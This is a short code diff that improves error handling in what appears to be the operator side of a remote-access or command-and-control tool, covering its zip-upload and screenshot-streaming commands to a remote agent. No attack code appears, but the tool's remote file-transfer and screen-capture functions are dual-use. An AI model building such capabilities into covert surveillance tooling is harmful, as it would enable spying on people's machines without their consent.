@@ -1041,8 +1041,8 @@ def cmd_zip_upload(session: Session, args: list[str]) -> CommandResult:
         send_file(session.conn, tmp_path)
         try:
             ack = recv_msg(session.conn)
-        except Exception:
-            ack = ""
+        except (ConnectionError, OSError, ValueError) as e:
+            return _err(f"[-] zip_upload sent but no ACK received: {e}")
         return _ok(f"[+] Uploaded '{local_dir}' as '{remote_name}'"
                    + (f"\n    Agent: {ack}" if ack else ""))
     finally:
@@ -1638,6 +1638,9 @@ def cmd_screenshot_stream(session: Session, args: list[str]) -> CommandResult:
                 with open(fname, "wb") as f:
                     f.write(data)
                 frames_saved += 1
+            elif isinstance(msg, str) and msg.startswith("[-]"):
+                # Agent returned an error string instead of starting the stream
+                return _err(msg)
     except Exception as e:
         return _err(f"stream error after {frames_saved} frames: {e}")
     finally:
